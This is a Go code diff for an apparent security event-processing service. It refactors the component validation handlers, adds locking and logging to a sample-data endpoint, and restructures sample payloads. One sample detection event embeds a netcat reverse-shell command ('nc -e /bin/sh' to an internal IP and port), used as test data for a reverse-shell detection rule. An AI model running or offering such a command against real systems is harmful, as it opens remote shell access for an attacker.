@@ -933,32 +933,68 @@ func verifyComponent(c echo.Context) error {
 		}
 	}
 
-	var err error
 	switch singularType {
 	case "input":
-		err = input.Verify("", req.Raw)
+		err := input.Verify("", req.Raw)
+		if err != nil {
+			return c.JSON(http.StatusOK, map[string]interface{}{
+				"valid": false,
+				"error": err.Error(),
+			})
+		}
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"valid": true,
+		})
 	case "output":
-		err = output.Verify("", req.Raw)
+		err := output.Verify("", req.Raw)
+		if err != nil {
+			return c.JSON(http.StatusOK, map[string]interface{}{
+				"valid": false,
+				"error": err.Error(),
+			})
+		}
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"valid": true,
+		})
 	case "ruleset":
-		err = rules_engine.Verify("", req.Raw)
+		// Use detailed validation for rulesets
+		result, err := rules_engine.ValidateWithDetails("", req.Raw)
+		if err != nil {
+			return c.JSON(http.StatusOK, map[string]interface{}{
+				"valid": false,
+				"error": err.Error(),
+			})
+		}
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"valid":    result.IsValid,
+			"errors":   result.Errors,
+			"warnings": result.Warnings,
+		})
 	case "project":
-		err = project.Verify("", req.Raw)
+		err := project.Verify("", req.Raw)
+		if err != nil {
+			return c.JSON(http.StatusOK, map[string]interface{}{
+				"valid": false,
+				"error": err.Error(),
+			})
+		}
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"valid": true,
+		})
 	case "plugin":
-		err = plugin.Verify("", req.Raw, id)
+		err := plugin.Verify("", req.Raw, id)
+		if err != nil {
+			return c.JSON(http.StatusOK, map[string]interface{}{
+				"valid": false,
+				"error": err.Error(),
+			})
+		}
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"valid": true,
+		})
 	default:
 		return c.JSON(http.StatusBadRequest, map[string]string{"error": "unsupported component type"})
 	}
-
-	if err != nil {
-		return c.JSON(http.StatusOK, map[string]interface{}{
-			"valid": false,
-			"error": err.Error(),
-		})
-	}
-
-	return c.JSON(http.StatusOK, map[string]interface{}{
-		"valid": true,
-	})
 }
 
 // Cancel upgrade functions - delete both memory and temp files
@@ -1047,7 +1083,10 @@ func GetSamplerData(c echo.Context) error {
 	componentName := c.QueryParam("name")               // e.g., "input", "output", "ruleset"
 	nodeSequence := c.QueryParam("projectNodeSequence") // e.g., "input.kafka1", "ruleset.rule1"
 
+	logger.Info("GetSamplerData request", "componentName", componentName, "nodeSequence", nodeSequence)
+
 	if componentName == "" || nodeSequence == "" {
+		logger.Error("Missing required parameters for GetSamplerData", "componentName", componentName, "nodeSequence", nodeSequence)
 		return c.JSON(http.StatusBadRequest, map[string]string{
 			"error": "Missing required parameters: name and projectNodeSequence",
 		})
@@ -1056,6 +1095,7 @@ func GetSamplerData(c echo.Context) error {
 	// Parse node sequence to get component type and ID
 	parts := strings.Split(nodeSequence, ".")
 	if len(parts) < 2 {
+		logger.Error("Invalid projectNodeSequence format", "nodeSequence", nodeSequence)
 		return c.JSON(http.StatusBadRequest, map[string]string{
 			"error": "Invalid projectNodeSequence format, expected 'type.id'",
 		})
@@ -1063,6 +1103,8 @@ func GetSamplerData(c echo.Context) error {
 
 	componentType := parts[0]
 	componentId := strings.Join(parts[1:], ".")
+
+	logger.Info("Parsed component info", "componentType", componentType, "componentId", componentId)
 
 	// Initialize response structure
 	response := map[string]interface{}{
@@ -1074,29 +1116,97 @@ func GetSamplerData(c echo.Context) error {
 	// Get sample data based on component type
 	switch componentType {
 	case "input":
-		if input := project.GlobalProject.Inputs[componentId]; input != nil {
+		// Check with read lock
+		common.GlobalMu.RLock()
+		input := project.GlobalProject.Inputs[componentId]
+		inputCount := len(project.GlobalProject.Inputs)
+		common.GlobalMu.RUnlock()
+
+		logger.Info("Checking input component", "componentId", componentId, "found", input != nil, "totalInputs", inputCount)
+
+		if input != nil {
 			// For inputs, we can provide sample data based on the input type
 			sampleData := generateInputSampleData(input)
 			response[componentName].(map[string]interface{})[nodeSequence] = sampleData
+			logger.Info("Generated input sample data", "componentId", componentId, "sampleCount", len(sampleData))
+		} else {
+			// List available inputs for debugging
+			common.GlobalMu.RLock()
+			availableInputs := make([]string, 0, len(project.GlobalProject.Inputs))
+			for k := range project.GlobalProject.Inputs {
+				availableInputs = append(availableInputs, k)
+			}
+			common.GlobalMu.RUnlock()
+
+			logger.Error("Input component not found", "componentId", componentId, "availableInputs", availableInputs)
+			return c.JSON(http.StatusNotFound, map[string]string{
+				"error": fmt.Sprintf("Input component '%s' not found. Available inputs: %v", componentId, availableInputs),
+			})
 		}
 	case "output":
-		if output := project.GlobalProject.Outputs[componentId]; output != nil {
+		// Check with read lock
+		common.GlobalMu.RLock()
+		output := project.GlobalProject.Outputs[componentId]
+		outputCount := len(project.GlobalProject.Outputs)
+		common.GlobalMu.RUnlock()
+
+		logger.Info("Checking output component", "componentId", componentId, "found", output != nil, "totalOutputs", outputCount)
+
+		if output != nil {
 			// For outputs, provide sample data that would be sent
 			sampleData := generateOutputSampleData(output)
 			response[componentName].(map[string]interface{})[nodeSequence] = sampleData
+			logger.Info("Generated output sample data", "componentId", componentId, "sampleCount", len(sampleData))
+		} else {
+			// List available outputs for debugging
+			common.GlobalMu.RLock()
+			availableOutputs := make([]string, 0, len(project.GlobalProject.Outputs))
+			for k := range project.GlobalProject.Outputs {
+				availableOutputs = append(availableOutputs, k)
+			}
+			common.GlobalMu.RUnlock()
+
+			logger.Error("Output component not found", "componentId", componentId, "availableOutputs", availableOutputs)
+			return c.JSON(http.StatusNotFound, map[string]string{
+				"error": fmt.Sprintf("Output component '%s' not found. Available outputs: %v", componentId, availableOutputs),
+			})
 		}
 	case "ruleset":
-		if ruleset := project.GlobalProject.Rulesets[componentId]; ruleset != nil {
+		// Check with read lock
+		common.GlobalMu.RLock()
+		ruleset := project.GlobalProject.Rulesets[componentId]
+		rulesetCount := len(project.GlobalProject.Rulesets)
+		common.GlobalMu.RUnlock()
+
+		logger.Info("Checking ruleset component", "componentId", componentId, "found", ruleset != nil, "totalRulesets", rulesetCount)
+
+		if ruleset != nil {
 			// For rulesets, provide sample data that would trigger rules
 			sampleData := generateRulesetSampleData(ruleset)
 			response[componentName].(map[string]interface{})[nodeSequence] = sampleData
+			logger.Info("Generated ruleset sample data", "componentId", componentId, "sampleCount", len(sampleData))
+		} else {
+			// List available rulesets for debugging
+			common.GlobalMu.RLock()
+			availableRulesets := make([]string, 0, len(project.GlobalProject.Rulesets))
+			for k := range project.GlobalProject.Rulesets {
+				availableRulesets = append(availableRulesets, k)
+			}
+			common.GlobalMu.RUnlock()
+
+			logger.Error("Ruleset component not found", "componentId", componentId, "availableRulesets", availableRulesets)
+			return c.JSON(http.StatusNotFound, map[string]string{
+				"error": fmt.Sprintf("Ruleset component '%s' not found. Available rulesets: %v", componentId, availableRulesets),
+			})
 		}
 	default:
+		logger.Error("Unsupported component type", "componentType", componentType)
 		return c.JSON(http.StatusBadRequest, map[string]string{
 			"error": "Unsupported component type: " + componentType,
 		})
 	}
 
+	logger.Info("GetSamplerData response ready", "componentName", componentName, "nodeSequence", nodeSequence)
 	return c.JSON(http.StatusOK, response)
 }
 
@@ -1146,38 +1256,46 @@ func generateInputSampleData(input *input.Input) []interface{} {
 	switch input.Type {
 	case "kafka":
 		samples = append(samples, map[string]interface{}{
-			"timestamp": time.Now().Format(time.RFC3339),
-			"message":   "Sample Kafka message",
-			"topic":     input.Config.Kafka.Topic,
-			"partition": 0,
-			"offset":    12345,
-			"key":       "sample-key",
-			"value": map[string]interface{}{
-				"user_id":   "user123",
-				"action":    "login",
-				"ip":        "192.168.1.100",
-				"timestamp": time.Now().Unix(),
+			"data": map[string]interface{}{
+				"message":   "Sample Kafka message",
+				"topic":     input.Config.Kafka.Topic,
+				"partition": 0,
+				"offset":    12345,
+				"key":       "sample-key",
+				"value": map[string]interface{}{
+					"user_id":   "user123",
+					"action":    "login",
+					"ip":        "192.168.1.100",
+					"timestamp": time.Now().Unix(),
+				},
 			},
+			"timestamp": time.Now().Format(time.RFC3339),
+			"source":    "kafka_input_sample",
 		})
 	case "aliyun_sls":
 		samples = append(samples, map[string]interface{}{
-			"timestamp": time.Now().Format(time.RFC3339),
-			"project":   input.Config.AliyunSLS.Project,
-			"logstore":  input.Config.AliyunSLS.Logstore,
-			"source":    "sample-source",
-			"topic":     "sample-topic",
-			"content": map[string]interface{}{
-				"level":   "INFO",
-				"message": "Sample SLS log message",
-				"module":  "auth",
-				"user":    "user123",
+			"data": map[string]interface{}{
+				"project":  input.Config.AliyunSLS.Project,
+				"logstore": input.Config.AliyunSLS.Logstore,
+				"topic":    "sample-topic",
+				"content": map[string]interface{}{
+					"level":   "INFO",
+					"message": "Sample SLS log message",
+					"module":  "auth",
+					"user":    "user123",
+				},
 			},
+			"timestamp": time.Now().Format(time.RFC3339),
+			"source":    "aliyun_sls_input_sample",
 		})
 	default:
 		samples = append(samples, map[string]interface{}{
+			"data": map[string]interface{}{
+				"type": "sample",
+				"data": "Sample input data",
+			},
 			"timestamp": time.Now().Format(time.RFC3339),
-			"type":      "sample",
-			"data":      "Sample input data",
+			"source":    "generic_input_sample",
 		})
 	}
 
@@ -1191,37 +1309,49 @@ func generateOutputSampleData(output *output.Output) []interface{} {
 	switch output.Type {
 	case "kafka":
 		samples = append(samples, map[string]interface{}{
-			"timestamp": time.Now().Format(time.RFC3339),
-			"topic":     output.Config.Kafka.Topic,
-			"message": map[string]interface{}{
-				"alert_id":    "alert123",
-				"severity":    "high",
-				"description": "Sample security alert",
-				"source_ip":   "192.168.1.100",
-				"detected_at": time.Now().Unix(),
+			"data": map[string]interface{}{
+				"topic": output.Config.Kafka.Topic,
+				"message": map[string]interface{}{
+					"alert_id":    "alert123",
+					"severity":    "high",
+					"description": "Sample security alert",
+					"source_ip":   "192.168.1.100",
+					"detected_at": time.Now().Unix(),
+				},
 			},
+			"timestamp": time.Now().Format(time.RFC3339),
+			"source":    "kafka_output_sample",
 		})
 	case "elasticsearch":
 		samples = append(samples, map[string]interface{}{
-			"timestamp": time.Now().Format(time.RFC3339),
-			"index":     output.Config.Elasticsearch.Index,
-			"document": map[string]interface{}{
-				"@timestamp":  time.Now().Format(time.RFC3339),
-				"event_type":  "security_alert",
-				"severity":    "medium",
-				"description": "Sample ES document",
+			"data": map[string]interface{}{
+				"index": output.Config.Elasticsearch.Index,
+				"document": map[string]interface{}{
+					"@timestamp":  time.Now().Format(time.RFC3339),
+					"event_type":  "security_alert",
+					"severity":    "medium",
+					"description": "Sample ES document",
+				},
 			},
+			"timestamp": time.Now().Format(time.RFC3339),
+			"source":    "elasticsearch_output_sample",
 		})
 	case "print":
 		samples = append(samples, map[string]interface{}{
+			"data": map[string]interface{}{
+				"output": "Sample print output",
+				"level":  "INFO",
+			},
 			"timestamp": time.Now().Format(time.RFC3339),
-			"output":    "Sample print output",
-			"level":     "INFO",
+			"source":    "print_output_sample",
 		})
 	default:
 		samples = append(samples, map[string]interface{}{
+			"data": map[string]interface{}{
+				"data": "Sample output data",
+			},
 			"timestamp": time.Now().Format(time.RFC3339),
-			"data":      "Sample output data",
+			"source":    "generic_output_sample",
 		})
 	}
 
@@ -1234,31 +1364,37 @@ func generateRulesetSampleData(ruleset *rules_engine.Ruleset) []interface{} {
 
 	// Generate sample data that would trigger rules
 	samples = append(samples, map[string]interface{}{
-		"timestamp": time.Now().Format(time.RFC3339),
-		"rule_type": "detection",
-		"input_data": map[string]interface{}{
-			"command":   "/bin/bash",
-			"args":      []string{"-c", "nc -e /bin/sh 192.168.1.1 4444"},
-			"user":      "www-data",
-			"pid":       1234,
-			"source_ip": "192.168.1.100",
+		"data": map[string]interface{}{
+			"rule_type": "detection",
+			"input_data": map[string]interface{}{
+				"command":   "/bin/bash",
+				"args":      []string{"-c", "nc -e /bin/sh 192.168.1.1 4444"},
+				"user":      "www-data",
+				"pid":       1234,
+				"source_ip": "192.168.1.100",
+			},
+			"matched_rules": []string{"reverse_shell_detection"},
+			"severity":      "high",
 		},
-		"matched_rules": []string{"reverse_shell_detection"},
-		"severity":      "high",
+		"timestamp": time.Now().Format(time.RFC3339),
+		"source":    "ruleset_detection_sample",
 	})
 
 	samples = append(samples, map[string]interface{}{
-		"timestamp": time.Now().Add(-1 * time.Minute).Format(time.RFC3339),
-		"rule_type": "classification",
-		"input_data": map[string]interface{}{
-			"http_method": "POST",
-			"url":         "/admin/login",
-			"status_code": 401,
-			"user_agent":  "curl/7.68.0",
-			"source_ip":   "192.168.1.200",
+		"data": map[string]interface{}{
+			"rule_type": "classification",
+			"input_data": map[string]interface{}{
+				"http_method": "POST",
+				"url":         "/admin/login",
+				"status_code": 401,
+				"user_agent":  "curl/7.68.0",
+				"source_ip":   "192.168.1.200",
+			},
+			"classification": "suspicious_login_attempt",
+			"confidence":     0.85,
 		},
-		"classification": "suspicious_login_attempt",
-		"confidence":     0.85,
+		"timestamp": time.Now().Format(time.RFC3339),
+		"source":    "ruleset_classification_sample",
 	})
 
 	return samples
